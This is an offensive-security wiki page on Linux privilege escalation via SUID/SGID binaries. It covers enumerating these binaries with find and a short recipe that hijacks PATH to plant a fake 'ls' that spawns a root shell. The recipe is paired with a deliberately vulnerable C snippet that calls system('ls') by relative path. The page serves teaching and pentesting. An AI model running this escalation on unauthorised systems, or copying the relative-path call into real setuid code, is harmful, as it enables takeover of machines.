---
authors: ShutdownRepo, dreamkinn, p0dalirius
category: infra
---

# SUID/SGID binaries

## Theory

On UNIX-like systems, binaries have permissions, just like any other file. Some of them often are over-privileged, sometimes allowing attackers to escalate their privileges on the system. The common permissions are read, write, execute. The extended ones are setuid, setgid, sticky bit, and so on.

The setuid/setgid (SUID/SGID) bits allows the binary to run with the privileges of the user/group owner instead of those of the user executing it. They can be spotted with the `s` or `S` permission in the file user or group owner permissions (i.e. `---s--s---`). When the file permissions features an uppercase `S` instead of a lowercase one, it means the corresponding user or group owner doesn't have execution rights.

> [!CAUTION]
> Limitations
> 
> * Just like capabilities, setuid and setgid bits are unset when a file is copied with `cp` or when its content changes.
> * Some partitions of the UNIX file system can be mounted with the `nosuid` option. In this case the setuid and setgid bits are ignored for binaries placed inside those partitions. It is a common good practice for tmpfs partitions like `/tmp` or`/run`. Searching the `/proc/mounts` pseudo-file for a `nosuid` flag can help find these partitions.

## Practice

All suid or sgid-enabled files the user can have access to can be listed with the following command.

```bash
find $starting_path -perm -u=s -type f 2>/dev/null

# Or in octal mode
find $starting_path -perm -4000 -type f 2>/dev/null
```

Vulnerable programs with these permissions are often targeted by attacker to obtain the user (for setuid) or group (for setgid) privileges. There are many techniques that attackers can use to hijack these binaries and obtain the associated rights.

### Living of the land

Using standard binaries features to bypass security restrictions is called Living off the land.


[living-off-the-land.md](living-off-the-land.md)


### Relative path calls

If a SUID/SGID binary makes calls to programs using relative paths instead of absolute paths, attackers can try to make the binary run a program controlled by the attacker. Let's take this vulnerable program as an example : 


```c
int function(int argc, char *argv[]){
/* ... */
 system("ls") // instead of system("/usr/bin/ls")
/* ... */
}
```


In the example above, the SUID/SGID binary calls the `ls` program using a relative path. An attacker can try to create a `ls` program somewhere he has write access to and edit the `PATH` environment variable so that his custom program is executed when running the SUID/SGID binary.

```bash
mkdir -p /tmp/attacker
cd /tmp/attacker && printf '#!/bin/sh\nexec /bin/sh\n' > /tmp/attacker/ls
chmod +x /tmp/attacker/ls 
PATH=/tmp/attacker:$PATH ./vuln
```

When the `vuln` program will be executed, the malicious `ls` program will be called and a shell will be opened. 

### Binary exploitation

In some cases, the binary that has SUID/SGID permissions can be reverse-engineered and attackers find ways to change the execution flow of that program to make it run something else.

## Resources

[https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)